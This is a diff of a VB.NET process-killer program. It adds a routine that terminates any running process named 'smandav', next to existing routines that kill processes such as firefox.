@@ -26,10 +26,17 @@ Public Class KillerMainProgram
             End If
         Next
     End Sub
+
+    Sub smandav()
+        For Each proc As Process In Process.GetProcesses
+            If proc.ProcessName = "smandav" Then
+                proc.Kill()
+            End If
+        Next
+    End Sub
 #End Region
 
 #Region "browser"
-
     Sub firefox()
         For Each proc As Process In Process.GetProcesses
             If proc.ProcessName = "firefox" Then
